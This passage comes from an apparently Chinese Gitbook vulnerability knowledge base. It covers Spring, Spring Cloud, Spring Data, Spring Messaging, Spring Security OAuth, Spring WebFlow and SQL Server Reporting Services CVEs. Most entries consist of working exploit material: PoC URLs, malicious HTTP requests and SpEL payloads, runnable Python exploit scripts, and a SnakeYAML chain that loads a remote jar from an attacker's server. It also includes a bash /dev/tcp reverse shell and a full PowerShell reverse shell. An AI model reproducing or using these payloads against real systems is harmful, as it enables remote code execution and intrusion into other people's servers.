在跟到environment/NativeEnvironmentRepository.java的时候发现参数进行了拼接,SpringCloudConfig目录穿越漏洞/media/rId28.png)重新跟进getArgs看一下 private String[] getArgs(String application, String profile, String label) { List list = new ArrayList(); String config = application; if (!config.startsWith(\"application\")) { config = \"application,\" + config; } list.add(\"--spring.config.name=\" + config); list.add(\"--spring.cloud.bootstrap.enabled=false\"); list.add(\"--encrypt.failOnError=\" + this.failOnError); list.add(\"--spring.config.location=\" + StringUtils.arrayToCommaDelimitedString( getLocations(application, profile, label).getLocations())); return list.toArray(new String[0]); } 主要在getLocations中对路径进行了下拼接,声称了一个将env中的uri拼接了label,生成新的location,那么这个点就是我们目录穿越的关键,继续往下跟,在environment/NativeEnvironmentRepository.java中会将args传入spring boot的ConfigurableApplicationContext context = builder.run(args),后面会使用loader.load函数加载资源,在加载资源的时候会遍历locations拼接name来获取资源,首先来判断是否存在文件,如果文件存在,则去使用url.openConnection来获取资源,通过分析我们知道label和name是我们可控的传入, url = env-uri+label+name+extension 因为是借助的url.openConnection,结合补丁增加了#限制,我们可以清楚的知道通过在name中以#结尾,使extension成为锚点,也就绕过了后缀的限制。在构造poc之前其实还有一个问题，就是这里我们知道一开始是没有对路径进行检测的,那么我们是否可以直接使用../../来穿越呢?答案是否,因为如果我们想要传入后端处理,必须二次url编码,但是二次编码后,首先经过的是判断文件是否存在,如果存在才调用url.openConnection来处理,经过一次解码后,显然该路径文件是不存在的。 SpringCloudConfig目录穿越漏洞/media/rId29.png) 这里就有了跟CVE-2020-5405一样的操作,将(_)替换成了/,处理方法在 public static String normalize(String s) { if (s != null && s.contains(SLASH_PLACEHOLDER)) { // \"(_)\" is uncommon in a git repo name, but \"/\" cannot be matched // by Spring MVC return s.replace(SLASH_PLACEHOLDER, \"/\"); } return s; } poc http://www.0-sec.org:8889/flag.txt%23/222/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29 SpringCloudConfig目录穿越漏洞/media/rId31.png) 构造完这个poc会想到,既然是label+name来拼接的,我们是否可以不用管label,目录穿越的方法在name处构造呢?答案是可以的,poc如下 http://www.0-sec.org:8889/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Fflag.txt%23/222/11 SpringCloudConfig目录穿越漏洞/media/rId32.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:21 "},"Web安全/Spring Cloud/Spring Cloud SnakeYAML RCE/Spring Cloud SnakeYAML RCE.html":{"url":"Web安全/Spring Cloud/Spring Cloud SnakeYAML RCE/Spring Cloud SnakeYAML RCE.html","title":"Spring Cloud Snake YAML RCE","keywords":"","body":"Spring Cloud SnakeYAML RCE 一、漏洞简介 利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标依赖的 spring-cloud-starter 版本 \\ 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 二、漏洞影响 三、复现过程 漏洞分析： spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址 refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容 SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化 实例化类时执行恶意代码，造成 RCE 漏洞 漏洞复现 步骤一： 托管 yml 和 jar 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） # 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80 在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下： !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://your-vps-ip/example.jar\"] ]] ] 在网站根目录下放置后缀为 jar 的文件 example.jar，内容是要执行的代码，代码编写及编译方式参考 yaml-payload https://github.com/artsploit/yaml-payload 步骤二： 设置 spring.cloud.bootstrap.location 属性 spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/example.yml spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/example.yml\"} 步骤三： 刷新配置 spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:07 "},"Web安全/Spring Data/（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞/（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞.html":{"url":"Web安全/Spring Data/（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞/（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞.html","title":"（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞","keywords":"","body":"（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞 一、漏洞简介 Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中（实现RFC6902），path的值被传入setValue，导致执行了SpEL表达式，触发远程命令执行漏洞。 二、漏洞影响 PivotalSpringDataREST2.5.12之前的版本，2.6.7之前的版本，3.0RC3之前的版本 SpringBoot2.0.0M4之前版本 SpringDataKay-RC3之前的版本 三、复现过程 访问http://www.0-sec.org:8080/customers/1，看到一个资源。我们使用PATCH请求来修改之： PATCH /customers/1 HTTP/1.1 Host: www.0-sec.org:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json-patch+json Content-Length: 202 [{ \"op\": \"replace\", \"path\": \"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname\", \"value\": \"vulhub\" }] path的值是SpEL表达式，发送上述数据包，将执行new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}表示的命令touch /tmp/success。然后进入容器docker-compose exec spring bash看看： SpringDataRest远程命令执行漏洞/media/rId24.png) 可见，success成功创建。 将bytecode改成反弹shell的命令（注意：Java反弹shell的限制与绕过方式），成功弹回： SpringDataRest远程命令执行漏洞/media/rId26.png) 参考链接 https://github.com/vulhub/vulhub/tree/master/spring/CVE-2017-8046 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:25 "},"Web安全/Spring Data/（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞/（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞.html":{"url":"Web安全/Spring Data/（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞/（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞.html","title":"（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞","keywords":"","body":"（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞 一、漏洞简介 攻击者可以构造恶意的请求对Spring Data REST发起攻击，包括使用基于HTTP资源的，或者其他请求基于Spring Data's projection负载结合的，最终导致远程代码执行攻击。 二、漏洞影响 Spring Data Commons 1.13 - 1.13.10(Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 - 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5) 三、复现过程 POST /users?page=&size=5 HTTP/1.1 Host: localhost:8080 Connection: keep-alive Content-Length: 124 Pragma: no-cache Cache-Control: no-cache Origin: http://localhost:8080 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://localhost:8080/users?page=0&size=5 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/success\")]=&password=&repeatedPassword= 执行docker-compose exec spring bash进入容器中，可见成功创建/tmp/success，说明命令执行成功： SpringDataCommons组件远程代码执行漏洞/media/rId24.png) poc cve-2018-1273_cmd.py #!/usr/bin/python3 #-*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub # telegram:t.me/zhzyker import requests import sys if len(sys.argv)!=3: print('+----------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ Spring Data Commons Remote Code Execution (No display) +') print('+----------------------------------------------------------------------------+') print('+ USE: python3 cve-2018-1273_cmd.py \"\" +') print('+ EXP: python3 cve-2018-1273_cmd.py http://1.1.1.1:8080 \"touch /tmp/exphub\" +') print('+ VER: Spring Data Commons 1.13 to 1.13.10 +') print('+ Spring Data Commons 2.0 to 2.0.5 +') print('+----------------------------------------------------------------------------+') sys.exit() url = sys.argv[1] cmd = sys.argv[2] vuln = url + \"/users\" headers = { 'Host': \"localhost:8080\", 'Connection': \"keep-alive\", 'Content-Length': \"120\", 'Pragma': \"no-cache\", 'Cache-Control': \"no-cache\", 'Origin': \"http://localhost:8080\", 'Upgrade-Insecure-Requests': \"1\", 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\", 'Accept': \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", 'Referer': \"http://localhost:8080/users?page=0&size=5\", 'Accept-Encoding': \"gzip, deflate, br\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\" } payload = \"username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=\" % cmd try: r = requests.post(vuln, data=payload, headers=headers) if r.status_code == 500: print (\"[+] Code executed successfully\") else: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") except: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:26 "},"Web安全/Spring Messaging/（CVE-2018-1270）Spring Messaging 远程命令执行漏洞/（CVE-2018-1270）Spring Messaging 远程命令执行漏洞.html":{"url":"Web安全/Spring Messaging/（CVE-2018-1270）Spring Messaging 远程命令执行漏洞/（CVE-2018-1270）Spring Messaging 远程命令执行漏洞.html","title":"（CVE-2018-1270）Spring Messaging 远程命令执行漏洞","keywords":"","body":"（CVE-2018-1270）Spring Messaging 远程命令执行漏洞 一、漏洞简介 spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS， 在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。 二、漏洞影响 Spring Java Framework \\ 三、复现过程 网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。 连接后端服务器的流程，可以理解为： 用STOMP协议将数据组合成一个文本流 用sockjs协议发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通信 所以我们可以使用http来复现漏洞，称之为\"降维打击\"。 我编写了一个简单的POC脚本exploit.py（需要用python3.6执行），因为该漏洞是订阅的时候插入SpEL表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有： 基础地址，在vulhub中为http://your-ip:8080/gs-guide-websocket 待执行的SpEL表达式，如T(java.lang.Runtime).getRuntime().exec('touch /tmp/success') 某一个订阅的地址，如vulhub中为：/topic/greetings 如何触发这个订阅，即如何让后端向这个订阅发送消息。在vulhub中，我们向/app/hello发送一个包含name的json，即可触发这个事件。当然在实战中就不同了，所以这个poc并不具有通用性。 根据你自己的需求修改POC。如果是vulhub环境，你只需修改1中的url即可。 CVE-2018-1270.py #!/usr/bin/env python3 import requests import random import string import time import threading import logging import sys import json logging.basicConfig(stream=sys.stdout, level=logging.INFO) def random_str(length): letters = string.ascii_lowercase + string.digits return ''.join(random.choice(letters) for c in range(length)) class SockJS(threading.Thread): def __init__(self, url, *args, **kwargs): super().__init__(*args, **kwargs) self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}' self.daemon = True self.session = requests.session() self.session.headers = { 'Referer': url, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)' } self.t = int(time.time()*1000) def run(self): url = f'{self.base}/htmlfile?c=_jp.vulhub' response = self.session.get(url, stream=True) for line in response.iter_lines(): time.sleep(0.5) def send(self, command, headers, body=''): data = [command.upper(), '\\n'] data.append('\\n'.join([f'{k}:{v}' for k, v in headers.items()])) data.append('\\n\\n') data.append(body) data.append('\\x00') data = json.dumps([''.join(data)]) response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data) if response.status_code != 204: logging.info(f\"send '{command}' data error.\") else: logging.info(f\"send '{command}' data success.\") def __del__(self): self.session.close() sockjs = SockJS('http://your-ip:8080/gs-guide-websocket') sockjs.start() time.sleep(1) sockjs.send('connect', { 'accept-version': '1.1,1.0', 'heart-beat': '10000,10000' }) sockjs.send('subscribe', { 'selector': \"T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\", 'id': 'sub-0', 'destination': '/topic/greetings' }) data = json.dumps({'name': 'vulhub'}) sockjs.send('send', { 'content-length': len(data), 'destination': '/app/hello' }, data) 执行： SpringMessaging远程命令执行漏洞/media/rId26.png) 进入容器docker-compose exec spring bash，可见/tmp/success已成功创建： SpringMessaging远程命令执行漏洞/media/rId27.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:27 "},"Web安全/Spring Security Oauth/（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞/（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞.html":{"url":"Web安全/Spring Security Oauth/（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞/（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞.html","title":"（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞","keywords":"","body":"（CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞 一、漏洞简介 Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。 二、漏洞影响 Spring Security OAuth 2.0.0版本至2.0.9版本Spring Security OAuth 1.0.0版本至1.0.5版本中 三、复现过程 访问http://www.0-sec.org:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test。首先需要填写用户名和密码，我们这里填入admin:admin即可。 可见，我们输入是SpEL表达式${233*233}已经成功执行并返回结果： SpringSecurityOAuth2远程命令执行漏洞/media/rId24.png) 然后，我们使用poc.py来生成反弹shell的POC（注意：[Java反弹shell的限制与绕过方式要在这个网站进行转码] http://www.jackson-t.ca/runtime-exec-payloads.html CVE-2016-4977.py #!/usr/bin/env python message = input('Enter message to encode:') poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0]) for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) poc += ')}' print(poc) SpringSecurityOAuth2远程命令执行漏洞/media/rId25.png) 如上图，生成了一大串SpEL语句。附带上这个SpEL语句，访问成功弹回shell： SpringSecurityOAuth2远程命令执行漏洞/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:29 "},"Web安全/Spring Security Oauth/（CVE-2018-1260）Spring Security Oauth2 远程代码执行/（CVE-2018-1260）Spring Security Oauth2 远程代码执行.html":{"url":"Web安全/Spring Security Oauth/（CVE-2018-1260）Spring Security Oauth2 远程代码执行/（CVE-2018-1260）Spring Security Oauth2 远程代码执行.html","title":"（CVE-2018-1260）Spring Security Oauth2 远程代码执行","keywords":"","body":"（CVE-2018-1260）Spring Security Oauth2 远程代码执行 一、漏洞简介 二、漏洞影响 Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14 三、复现过程 漏洞分析 先简要补充一下关于OAuth2.0的相关知识。SpringSecurityOauth2远程代码执行/media/rId25.png)以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。 在获得access token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数scope，这个参数用于表示客户端申请的权限的范围。 ，根据官方文档，在spring-security-oauth的默认配置中scope参数默认为空： scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope. 为明白起见，我们在demo中将其清楚写出： clients.inMemory() .withClient(\"client\") .authorizedGrantTypes(\"authorization_code\") .scopes(); 接着开始正式分析。当我们访问http://localhost:8080/oauth/authorize重定向至http://localhost:8080/login并完成login后程序流程到达org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码： @RequestMapping(value = \"/oauth/authorize\") public ModelAndView authorize(Map model, @RequestParam Map parameters, SessionStatus sessionStatus, Principal principal) { // Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should // query off of the authorization request instead of referring back to the parameters map. The contents of the // parameters map will be stored without change in the AuthorizationRequest object once it is created. AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters); try { ... // We intentionally only validate the parameters requested by the client (ignoring any data that may have // been added to the request by the manager). oauth2RequestValidator.validateScope(authorizationRequest, client); ... // Place auth request into the model so that it is stored in the session // for approveOrDeny to use. That way we make sure that auth request comes from the session, // so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session. model.put(\"authorizationRequest\", authorizationRequest); return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal); } ... 第115行SpringSecurityOauth2远程代码执行/media/rId27.png)在执行完AuthorizationRequest authorizationRequest = ...后，authorizationRequest代表了要认证的请求，其中包含了众多参数SpringSecurityOauth2远程代码执行/media/rId28.png) 在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行： // We intentionally only validate the parameters requested by the client (ignoring any data that may have // been added to the request by the manager). oauth2RequestValidator.validateScope(authorizationRequest, client); 在这里将对scope参数进行验证。跟入validateScope到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19 public class DefaultOAuth2RequestValidator implements OAuth2RequestValidator { public void validateScope(AuthorizationRequest authorizationRequest, ClientDetails client) throws InvalidScopeException { validateScope(authorizationRequest.getScope(), client.getScope()); } ... } 继续跟入validateScope，至 org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28 private void validateScope(Set requestScopes, Set clientScopes) { if (clientScopes != null && !clientScopes.isEmpty()) { for (String scope : requestScopes) { if (!clientScopes.contains(scope)) { throw new InvalidScopeException(\"Invalid scope: \" + scope, clientScopes); } } } if (requestScopes.isEmpty()) { throw new InvalidScopeException(\"Empty scope (either the client or the user is not allowed the requested scopes)\"); } } 首先检查clientScopes，这个clientScopes即我们在前面configure中配置的.scopes();，倘若不为空，则进行白名单检查。举个例子，如果前面配置.scopes(\"chybeta\");，则传入requestScopes必须为chybeta，否则会直接抛出异常Invalid scope:xxx。但由于此处查clientScopes为空值，则接下来仅仅做了requestScopes.isEmpty()的检查并且通过。 在完成了各项检查和配置后，在authorize函数的最后执行： return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal); 回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入getUserApprovalPageResponse 至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241：SpringSecurityOauth2远程代码执行/media/rId29.png) 生成对应的model和view，之后将会forward到/oauth/confirm_access。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20 public class WhitelabelApprovalEndpoint {\\@RequestMapping(\\\"/oauth/confirm_access\\\")public ModelAndView getAccessConfirmation(Map\\ model, HttpServletRequest request) throws Exception {String template = createTemplate(model, request);if (request.getAttribute(\\\"_csrf\\\") != null) {model.put(\\\"_csrf\\\", request.getAttribute(\\\"_csrf\\\"));}return new ModelAndView(new SpelView(template), model);}...}跟入createTemplate，第29行： protected String createTemplate(Map\\ model, HttpServletRequest request) {String template = TEMPLATE;if (model.containsKey(\\\"scopes\\\") || request.getAttribute(\\\"scopes\\\") != null) {template = template.replace(\\\"%scopes%\\\", createScopes(model, request)).replace(\\\"%denial%\\\", \\\"\\\");}...return template;}跟入createScopes，第46行：SpringSecurityOauth2远程代码执行/media/rId30.png) 这里获取到了scopes，并且通过for循环生成对应的builder，其实就是html和一些标签等，最后返回的即builder.toString(),其值如下: scope.${T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")}: Approve Deny createScopes结束后将会把上述builder.toString()拼接到template中。createTemplate结束后，在getAccessConfirmation的最后： return new ModelAndView(new SpelView(template), model); 根据template生成对应的SpelView对象，这是其构造函数：SpringSecurityOauth2远程代码执行/media/rId31.png)此后在页面渲染的过程中，将会执行页面中的Spel表达式${T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")}从而造成代码执行。 SpringSecurityOauth2远程代码执行/media/rId32.png) 所以综上所述，这个任意代码执行的利用条件实在\"苛刻\"： 需要scopes没有配置白名单，否则直接Invalid scope:xxx。不过大部分OAuth都会限制授权的范围，即指定scopes。 使用了默认的Approval Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。 漏洞复现 利用github上已有的demo： git clone https://github.com/wanghongfei/spring-security-oauth2-example.git 确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10进入spring-security-oauth2-example，修改 cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行: @Override public void configure(ClientDetailsServiceConfigurer clients) throws Exception { clients.inMemory() .withClient(\"client\") .authorizedGrantTypes(\"authorization_code\") .scopes(); } 根据spring-security-oauth2-example创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。 访问： http://www.0-sec.org:8080/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.github.com/chybeta&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D 会重定向到login页面，随意输入username和password，点击login，触发payload。SpringSecurityOauth2远程代码执行/media/rId35.gif) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:35 "},"Web安全/Spring Security Oauth/（CVE-2019-3778）Spring Security OAuth2 开放重定向/（CVE-2019-3778）Spring Security OAuth2 开放重定向.html":{"url":"Web安全/Spring Security Oauth/（CVE-2019-3778）Spring Security OAuth2 开放重定向/（CVE-2019-3778）Spring Security OAuth2 开放重定向.html","title":"（CVE-2019-3778）Spring Security OAuth2 开放重定向","keywords":"","body":"（CVE-2019-3778）Spring Security OAuth2 开放重定向 一、漏洞简介 限制条件： 有问题的Spring Security OAuth2版本 oAuth认证使用授权码模式 用户需要在登录的情况下 二、漏洞影响 Spring Security OAuth 2.3 to 2.3.4Spring Security OAuth 2.2 to 2.2.3Spring Security OAuth 2.1 to 2.1.3Spring Security OAuth 2.0 to 2.0.16 三、复现过程 用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。 例如原始请求如下： /auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://localhost:8086/login 只需要修改为： /auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://%localhost:8086/login 这样就不会产生原本的认证错误，而且直接跳转到地址 Location: http://localhost:8086/login Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:38 "},"Web安全/Spring WebFlow/（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞/（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞.html":{"url":"Web安全/Spring WebFlow/（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞/（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞.html","title":"（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞","keywords":"","body":"（CVE-2017-4971）Spring WebFlow 远程代码执行漏洞 一、漏洞简介 Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。 二、漏洞影响 Spring Web Flow 2.4.0版本至2.4.4版本 三、复现过程 首先访问http://www.0-sec.org:8080/login，用页面左边给出的任意一个账号/密码登录系统：SpringWebFlow远程代码执行漏洞/media/rId24.png)然后访问id为1的酒店http://www.0-sec.org/hotels/1，点击预订按钮\"Book Hotel\"，填写相关信息后点击\"Process\"（从这一步，其实WebFlow就正式开始了）： SpringWebFlow远程代码执行漏洞/media/rId25.png) 再点击确认\"Confirm\"： SpringWebFlow远程代码执行漏洞/media/rId26.png)此时抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）： _(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.0.0.1/21 0>&1\")).start()=vulhub SpringWebFlow远程代码执行漏洞/media/rId27.png)（注意：别忘记URL编码） 成功执行，获得shell： SpringWebFlow远程代码执行漏洞/media/rId28.png) 参考链接 https://github.com/vulhub/vulhub/tree/master/spring/CVE-2017-4971 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:40 "},"Web安全/SQL Server/（CVE-2020-0618）SQL Server 远程代码执行漏洞/（CVE-2020-0618）SQL Server 远程代码执行漏洞 .html":{"url":"Web安全/SQL Server/（CVE-2020-0618）SQL Server 远程代码执行漏洞/（CVE-2020-0618）SQL Server 远程代码执行漏洞 .html","title":"（CVE-2020-0618）SQL Server 远程代码执行漏洞 ","keywords":"","body":"（CVE-2020-0618）SQL Server 远程代码执行漏洞 一、漏洞简介 该漏洞需要经过身份验证后，攻击者向 SQL Server 的报告服务(Reporting Services) 发送特制请求进行触发。攻击成功可获得SQL Server服务的对应控制权限。 二、漏洞影响 产品 版本 修复补丁编号 SQL Server 2016 Service Pack 2(GDR) 13.0.5026.0 - 13.0.5101.9 KB4505220 SQL Server 2016 Service Pack 2 CU11 13.0.5149.0 - 13.0.5598.27 KB4527378 SQL Server 2014 Service Pack 3 (GDR) 12.0.6024.0 - 12.0.6108.1 KB4505218 Server 2014 Service Pack 2 CU4 12.0.6205.1 - 12.0.6329.1 KB4500181 SQL Server 2012 Service Pack 4 (QFE) 11.0.7001.0 - 11.0.7462.6 KB4057116 三、复现过程 首先登陆 ReportServer/pages/ReportViewer.aspx POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded Content-Length: X NavigationCorrector$PageState=NeedsCorrection&NavigationCorrector$ViewState=[PayloadHere]&__VIEWSTATE= 可以在PowerShell中使用以下命令来使用ysoserial.net工具生成有效负载： $command = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.6.135\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) .\\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"powershell.exe -encodedCommand $encodedCommand\" -o base64 | clip 编译好的ysoserial.net下载地址：https://github.com/ianxtianxt/ysoserial.net/ ps：上述命令在powershell里面执行好后，会自动黏贴到剪贴板上。 SQLServer远程代码执行漏洞/media/rId26.png) 参考链接 https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:42 "},"Web安全/Squid/（CVE-2019-18679）Squid 敏感信息泄漏/（CVE-2019-18679）Squid 敏感信息泄漏.html":{"url":"Web安全/Squid/（CVE-2019-18679）Squid 敏感信息泄漏/（CVE-2019-18679）Squid 敏感信息泄漏.html","title":"（CVE-2019-18679）Squid 敏感信息泄漏","keywords":"","body":"（CVE-2019-18679）Squid 敏感信息泄漏 一、漏洞简介 